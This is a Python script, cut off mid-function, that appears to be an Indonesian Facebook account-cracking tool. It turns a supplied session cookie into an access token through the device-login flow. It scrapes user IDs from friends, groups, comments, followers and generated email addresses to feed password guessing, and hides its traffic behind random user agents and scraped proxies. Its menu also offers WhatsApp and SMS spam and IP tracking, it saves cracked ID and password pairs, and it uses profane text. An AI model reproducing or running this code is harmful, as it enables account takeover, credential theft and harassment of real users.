#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Tizen'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SAMSUNG SM-R835F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5])
    ugen.append(UaMainn)
 
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:asal_kota = cek_data["city"]
except:asal_kota = {'-'}
try:asal_reg = cek_data["region"]
except:asal_reg = cek_data['-']
try:times = cek_data["timezone"]
except:times = cek_data['-']
try:city = cek_data["city"]
except:city = cek_data['-']
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
		your_cookies = input(' ╰─  Masukan Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  Login Berhasil | python BrayennnFB.py");exit()
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	negara = requests.get("http://ip-api.com/json/").json()["country"]
	ip = requests.get("http://ip-api.com/json/").json()["query"]
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{waktu}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.2[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{asal_kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{asal_reg}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
	console.print(Columns(dia))
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD And AOREC XD",width=90,title=f"[bold green]Thanks To",padding=(0,5),style=f"bold white"))
	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Track Ip \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____brayennn___xd____ in ['1','01']:
		Dump_Publik()
	elif _____brayennn___xd____ in ['2','02']:
		dump_massal()
	elif _____brayennn___xd____ in ['3','03']:
		crack_group()
	elif _____brayennn___xd____ in ['4','04']:
		crack_email()
	elif _____brayennn___xd____ in ['5','05']:
		crack_file()
	elif _____brayennn___xd____ in ['6','06']:
		crack_nama()
	elif _____brayennn___xd____ in ['7','07']:
		pengikut()
	elif _____brayennn___xd____ in ['8','08']:
		komen()
	elif _____brayennn___xd____ in ['9','09']:
		file_cp()
	elif _____brayennn___xd____ in ['10']:
		result()
	elif _____brayennn___xd____ in ['11']:
		siu()
	elif _____brayennn___xd____ in('12'):
		spam_wa()
	elif _____brayennn___xd____ in('13'):
		spam_sms()
	elif _____brayennn___xd____ in('14'):
		lacakip()
	elif _____brayennn___xd____ in ['15']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
		time.sleep(5)
		login()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
def error():
	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
def siu():
	start()
	get_data_web()
	akhir()
	
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' [+] Masukan Id Postingan : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
	setting()

def get_komen(url):
	data = parser(ses.get(url).text,"html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			else:id.append(id+"|"+nama)
			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass				
#-----------------[ TRACK IP ]-----------------# 
def lacakip():
	link = input(f' [+] Masukan Ip : ')
	url = 'http://ip-api.com/json/' + link
	r = requests.get(url)
	data = json.loads(r.text)
	latitude = data['lat']
	longitude = data['lon']
	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
	try:
		request = requests.get(url)
		response = request.json()
	except (requests.ConnectionError):
		print(" [+] Koneksi Error")
		exit()
	if response['status'] == 'success':
		print('')
		print(" [+] Alamat IP : " + response['query'])
		print(" [+] Kota : " + response['city'])
		print(" [+] Negara : " + response['country'])
		print(" [+] Kode Negara : " + response['countryCode'])
		print(" [+] Latitude : " + str(response['lat']))
		print(" [+] Longitude : " + str(response['lon']))
		print(" [+] ISP : " + response['isp'])
		print(" [+] Link Google Maps :", google_maps_url)
	else:
		print(" [+] Alamat IP Yang Dimasukkan Salah")
#-----------------[ CRACK GRUP ]-----------------# 
def crack_group():
	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
	link = input(f' [+] Id Group : ')
	url = 'https://mbasic.facebook.com/'+link
	try:dump_grup(url)
	except KeyboardInterrupt:atur_atur()
	if len(dump)==0:
		exit(f' [+] Gagal Dhump Id Grup, Kemungkinan Grup Private')
	setting()

def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")
		for x in data.find_all("table"):
			par = x.text
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
				else:nama = par.split(" > ")[0]
				if id+"|"+nama in dump:pass
				else:dump.append(id+"|"+nama)
				print(f'\r [+] Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
		for z in data.find_all("a"):
			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
				dump_grup("https://m.facebook.com"+href)
	except:dump_grup(url)
		
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' [+] Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[bold cyan]01[bold white]] Crack Username                   [[bold cyan]03[bold white]] Crack File \n[[bold cyan]02[bold white]] Crack Followers                  [[bold cyan]04[bold white]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
	bray = input(f' [+] Pilih Menu Crack : ')
	if bray in(''):
		print(' [+] Pilih Yang Bener Asu ');back()
	if bray in('1','01'):
		crack_nama()
	elif bray in('2','02'):
		pengikut()
	elif bray in('3','03'):
		crack_file()
	elif bray in('4','04'):
		crack_email()
	else:
		print(' [+] Pilih Yang Bener Asu ')
		exit()
#----------------------[ CRACK USERNAME ]----------------------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = console.input(f' [+] Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
#-----------------[ CRACK EMAIL ]-----------------#
def crack_email():
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' [+] Masukan Nama Target : ')
	if ',' in str(nama):
		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' [+] Masukan Nama Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" [+] Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
	jumlah = console.input(f' [+] Total Dump : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in id:pass
		else:id.append(D+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/DUMP-FILE/')
	except FileNotFoundError:
		print(' [+] File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] Pilih : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] Pilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP-FILE/'+geh,'r').read().splitlines()
		except:
			print(' [+] File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' [+] Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' [+] File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' [+] Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n [+] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [+] Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' [+] File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
def Dump_Publik():
        with requests.Session() as ses:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
                #print(f'{xxx}─────────────────────────────')
